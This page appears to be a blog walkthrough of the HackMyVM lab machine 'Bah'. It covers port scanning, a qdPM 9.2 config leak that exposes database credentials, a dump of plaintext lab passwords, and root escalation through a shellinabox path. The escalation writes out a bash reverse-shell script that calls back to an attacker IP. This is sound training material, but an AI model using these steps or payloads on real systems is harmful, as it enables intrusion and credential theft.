<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Bah  端口探测  123456789sudo nmap -sT --min-rate 1000 -p- 192.168.1.130 Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-01-16 14:45 CSTNmap scan report for portal.bah.hmv (192.168.1.130)Host is up (0.0">
<meta property="og:type" content="article">
<meta property="og:title" content="HACK-MY-VM esay Bah">
<meta property="og:url" content="http://example.com/2025/01/15/bah-esay/index.html">
<meta property="og:site_name" content="WangYiHao">
<meta property="og:description" content="Bah  端口探测  123456789sudo nmap -sT --min-rate 1000 -p- 192.168.1.130 Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-01-16 14:45 CSTNmap scan report for portal.bah.hmv (192.168.1.130)Host is up (0.0">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/01/15/bah-esay/1.png">
<meta property="og:image" content="http://example.com/2025/01/15/bah-esay/2.png">
<meta property="og:image" content="http://example.com/2025/01/15/bah-esay/3.png">
<meta property="og:image" content="http://example.com/2025/01/15/bah-esay/4.png">
<meta property="article:published_time" content="2025-01-15T15:01:53.000Z">
<meta property="article:modified_time" content="2025-01-17T17:36:31.139Z">
<meta property="article:author" content="SunRT">
<meta property="article:tag" content="HACK-MY-VM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/01/15/bah-esay/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>HACK-MY-VM esay Bah</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/01/18/try-hack-me-lunix%E6%8F%90%E6%9D%83/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">پست پیشین</span>
      <span id="i-next" class="info" style="display:none;">پست یعدی</span>
      <span id="i-top" class="info" style="display:none;">بازگشت به بالا</span>
      <span id="i-share" class="info" style="display:none;">اشتراک‌گذاری</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/15/bah-esay/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/15/bah-esay/&text=HACK-MY-VM esay Bah"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/15/bah-esay/&is_video=false&description=HACK-MY-VM esay Bah"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HACK-MY-VM esay Bah&body=Check out this article: http://example.com/2025/01/15/bah-esay/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/15/bah-esay/&name=HACK-MY-VM esay Bah&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/15/bah-esay/&t=HACK-MY-VM esay Bah"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Bah</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">mysql匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">80端口测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HACK-MY-VM esay Bah
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">SunRT</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-15T15:01:53.000Z" itemprop="datePublished">2025-01-15</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/HACK-MY-VM/" rel="tag">HACK-MY-VM</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1>Bah</h1>

<h3>端口探测</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 1000 -p- 192.168.1.130 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 14:45 CST</span><br><span class="line">Nmap scan report for portal.bah.hmv (192.168.1.130)</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 08:00:27:2A:70:45 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<h3>mysql匿名登录</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  mysql -h 192.168.1.130 -P 3306 -u root -p                                                                                                                   </span><br><span class="line">Enter password: </span><br><span class="line">ERROR 1698 (28000): Access denied for user &#x27;root&#x27;@&#x27;192.168.1.4&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>匿名登录失败了</strong></p>
<h3>80端口测试</h3>

<p><img src="/2025/01/15/bah-esay/1.png" alt="1"></p>
<p><strong>是一个登录框，但是应该是不存在sql注入的，因为它的登录功能好像没有完善，sqlmap也没有跑出来结果，但是我们注意到底下的qdPM 9.2，我们尝试一下寻找该系统是否爆出过漏洞</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit qdPM 9.2                                                                                                                                        [14:49:32] </span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------</span><br><span class="line"> Exploit Title                                                                                                                                         |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------</span><br><span class="line">qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                           | php/webapps/50854.txt</span><br><span class="line">qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                         | php/webapps/50176.txt</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------</span><br></pre></td></tr></table></figure>

<p><strong>CSRF客户端请求伪造，这是一个需要配合的漏洞，我们先看看所谓的密码的泄露，尝试去找一找</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m php/webapps/50176.txt      //下载文件</span><br><span class="line">cat 50176.txt                                                                                                                                                [14:57:32] </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Date: 03/08/2021</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exploit Author: Leon Trappett (thepcn3rd)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Vendor Homepage: https://qdpm.net/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Software Link: https://sourceforge.net/projects/qdpm/files/latest/download</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Version: 9.2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4</span></span><br><span class="line"></span><br><span class="line">The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://&lt;website&gt;/core/config/databases.yml file and download</span><br></pre></td></tr></table></figure>

<p><strong>访问一个指定的路径，是有信息的泄露存在的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">http get http://192.168.1.130/core/config/databases.yml                                                                                                      [14:57:45] </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 273</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Date: Thu, 16 Jan 2025 06:59:44 GMT</span><br><span class="line">ETag: &quot;611d69c4-111&quot;</span><br><span class="line">Last-Modified: Wed, 18 Aug 2021 20:12:52 GMT</span><br><span class="line">Server: nginx/1.18.0</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: &#x27;mysql:dbname=qpm;host=localhost&#x27;</span><br><span class="line">      profiler: false</span><br><span class="line">      username: qpmadmin</span><br><span class="line">      password: &quot;&lt;?php echo urlencode(&#x27;qpmpazzw&#x27;) ; ?&gt;&quot;</span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>是有好东西的，看来用户名是：qpmadmin，密码是：qpmpazzw</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.1.130 -P 3306 -u qpmadmin -p                                                                                                                [14:59:50] </span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 35</span><br><span class="line">Server version: 10.5.11-MariaDB-1 Debian 11</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| hidden             |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| qpm                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.009 sec)</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [hidden]&gt; show tables;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_hidden |</span><br><span class="line">+------------------+</span><br><span class="line">| url              |</span><br><span class="line">| users            |</span><br><span class="line">+------------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [hidden]&gt; select * from url;</span><br><span class="line">+----+-------------------------+</span><br><span class="line">| id | url                     |</span><br><span class="line">+----+-------------------------+</span><br><span class="line">|  1 | http://portal.bah.hmv   |</span><br><span class="line">|  2 | http://imagine.bah.hmv  |</span><br><span class="line">|  3 | http://ssh.bah.hmv      |</span><br><span class="line">|  4 | http://dev.bah.hmv      |</span><br><span class="line">|  5 | http://party.bah.hmv    |</span><br><span class="line">|  6 | http://ass.bah.hmv      |</span><br><span class="line">|  7 | http://here.bah.hmv     |</span><br><span class="line">|  8 | http://hackme.bah.hmv   |</span><br><span class="line">|  9 | http://telnet.bah.hmv   |</span><br><span class="line">| 10 | http://console.bah.hmv  |</span><br><span class="line">| 11 | http://tmux.bah.hmv     |</span><br><span class="line">| 12 | http://dark.bah.hmv     |</span><br><span class="line">| 13 | http://terminal.bah.hmv |</span><br><span class="line">+----+-------------------------+</span><br><span class="line">13 rows in set (0.004 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [hidden]&gt; select * from users;</span><br><span class="line">+----+---------+---------------------+</span><br><span class="line">| id | user    | password            |</span><br><span class="line">+----+---------+---------------------+</span><br><span class="line">|  1 | jwick   | Ihaveafuckingpencil |</span><br><span class="line">|  2 | rocio   | Ihaveaflower        |</span><br><span class="line">|  3 | luna    | Ihavealover         |</span><br><span class="line">|  4 | ellie   | Ihaveapassword      |</span><br><span class="line">|  5 | camila  | Ihaveacar           |</span><br><span class="line">|  6 | mia     | IhaveNOTHING        |</span><br><span class="line">|  7 | noa     | Ihaveflow           |</span><br><span class="line">|  8 | nova    | Ihavevodka          |</span><br><span class="line">|  9 | violeta | Ihaveroot           |</span><br><span class="line">+----+---------+---------------------+</span><br><span class="line">9 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [hidden]&gt;</span><br></pre></td></tr></table></figure>

<p><strong>很多用户名，但是那个登录界面肯定是登录不了了，一个是登录的页面就没做好，另外就是人家那个是邮箱，这里没有，行吧，直接上url，更改本地的hosts文件</strong></p>
<p><img src="/2025/01/15/bah-esay/2.png" alt="2"></p>
<p><strong>第五个url解析到了一个登录的bash上面，那登录的账号密码估计就是了：</strong></p>
<p><img src="/2025/01/15/bah-esay/3.png" alt="3"></p>
<p><strong>第二个用户名和密码直接成功登录，这个浏览器操作不方便，直接反弹shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rocio@bah:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(rocio) gid=1000(rocio) groups=1000(rocio),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">rocio@bah:~$ </span><br></pre></td></tr></table></figure>

<p><strong>拿到了shell</strong></p>
<h3>提权</h3>

<p><strong>基本的定时任务，sudo -l ，历史命令，suid都看了，没发现啥有用的好东西，直接跑脚本，看一看进程里面有没有定时执行的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=27931  | ./pspy64 </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=27922  | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=27921  | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=14482  | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=14480  | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=14432  | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=796    | bash -i </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=795    | script </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=787    | bash -i </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=778    | -bash </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=773    | (sd-pam) </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=1000  PID=772    | /lib/systemd/systemd --user </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=766    | login -p -h 127.0.0.1 </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=0     PID=695    | </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=106   PID=529    | /usr/sbin/mariadbd </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=33    PID=467    | php-fpm: pool www</span><br><span class="line">2025/01/16 04:21:28 CMD: UID=33    PID=466    | php-fpm: pool www</span><br><span class="line">2025/01/16 04:21:28 CMD: UID=107   PID=441    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev </span><br><span class="line">2025/01/16 04:21:28 CMD: UID=33    PID=437    | nginx: worker process</span><br><span class="line">2025/01/16 04:21:28 CMD: UID=107   PID=434    | /usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev </span><br></pre></td></tr></table></figure>

<p><strong>这里的一个任务非常的奇怪，我们去问问gpt解释一下</strong></p>
<p>一条用于运行 <code>shellinabox</code> 的命令，<code>shellinabox</code> 是一个提供基于 Web 的 SSH 终端服务的工具。通过此命令，用户可以通过 Web 浏览器访问服务器的终端</p>
<p>对于 <code>-s /devel:root:root:/:/tmp/dev</code>：</p>
<table>
<thead>
<tr>
<th>部分</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>/devel</code></td>
<td>服务路径，表示用户通过 Web 访问 <code>http://&lt;host&gt;:4200/devel</code> 时，会连接到这个终端服务。</td>
</tr>
<tr>
<td><code>root</code></td>
<td>用户名，表示通过该路径登录的用户为 <code>root</code>。</td>
</tr>
<tr>
<td><code>root</code></td>
<td>用户组，表示通过该路径登录的用户组为 <code>root</code>。</td>
</tr>
<tr>
<td><code>/</code></td>
<td><code>chroot</code> 目录，表示登录用户的文件系统视图被限制在系统根目录 <code>/</code>，即没有启用隔离环境。</td>
</tr>
<tr>
<td><code>/tmp/dev</code></td>
<td>登录后的工作目录，表示用户成功登录后，默认进入的目录是 <code>/tmp/dev</code>。</td>
</tr>
</tbody></table>
<p><strong>这里的含义是切换目录，我们尝试写一个dev文件，反弹shell，看是否可以执行</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4/8888 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<p><strong>给的shell不好写，我们在kali里面写好，然后传过去，赋予执行权限，访问web地址</strong></p>
<p><img src="/2025/01/15/bah-esay/4.png" alt="4"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening on [any] 8888 ...</span><br><span class="line">Oconnect to [192.168.1.4] from (UNKNOWN) [192.168.1.130] 3336</span><br><span class="line">root@bah:/# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><strong>shell反弹成功，虽说是进入目录下，但是是执行了dev里面的命令，最后问gpt，给出的解释是：如果 <code>/tmp/dev</code> 是一个可执行文件，而不是目录，终端会试图执行该文件</strong></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Bah</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">mysql匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">80端口测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/15/bah-esay/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/15/bah-esay/&text=HACK-MY-VM esay Bah"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/15/bah-esay/&is_video=false&description=HACK-MY-VM esay Bah"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HACK-MY-VM esay Bah&body=Check out this article: http://example.com/2025/01/15/bah-esay/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/15/bah-esay/&title=HACK-MY-VM esay Bah"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/15/bah-esay/&name=HACK-MY-VM esay Bah&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/15/bah-esay/&t=HACK-MY-VM esay Bah"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
